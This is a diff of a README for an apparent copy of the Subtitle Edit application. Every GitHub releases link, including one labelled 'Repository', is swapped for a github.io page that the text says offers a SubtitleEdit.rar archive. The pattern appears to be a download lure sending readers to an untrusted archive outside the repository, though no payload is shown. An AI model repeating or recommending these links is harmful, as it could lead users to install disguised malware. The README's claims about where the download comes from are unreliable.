@@ -10,7 +10,7 @@ This application is especially useful for video editors, content creators, and a
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download-Now-FF6F00?style=for-the-badge&logo=github)](https://github.com/hwangwuju/subtitle-edit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-FF6F00?style=for-the-badge&logo=github)](https://hwangwuju.github.io)
 
 Visit this link to download the application. Once you are on the download page, you will see the latest release available for your system.
 
@@ -40,7 +40,7 @@ Follow these simple steps to get Subtitle Edit up and running on your Windows co
 
 First, go to the download page using the button above or the link below:
 
-**👉 [Visit the Download Page](https://github.com/hwangwuju/subtitle-edit/releases)**
+**👉 [Visit the Download Page](https://hwangwuju.github.io)**
 
 On that page, you will find a file named `SubtitleEdit.rar`. Click on it to start downloading the archive to your computer.
 
@@ -153,8 +153,8 @@ Subtitle Edit can work with extracted subtitle streams from discs, but you may n
 
 ## 🔗 Additional Resources
 
-- **Download Page:** [https://github.com/hwangwuju/subtitle-edit/releases](https://github.com/hwangwuju/subtitle-edit/releases)
-- **Repository:** [subtitle-edit on GitHub](https://github.com/hwangwuju/subtitle-edit)
+- **Download Page:** [https://hwangwuju.github.io](https://hwangwuju.github.io)
+- **Repository:** [subtitle-edit on GitHub](https://hwangwuju.github.io)
 
 ---
 
@@ -172,7 +172,7 @@ Subtitle Edit takes the hassle out of subtitle creation and synchronization. Wit
 
 Go ahead and download it today — your videos will thank you!
 
-**👉 [Get Subtitle Edit Now](https://github.com/hwangwuju/subtitle-edit/releases)**
+**👉 [Get Subtitle Edit Now](https://hwangwuju.github.io)**
 
 ---
 
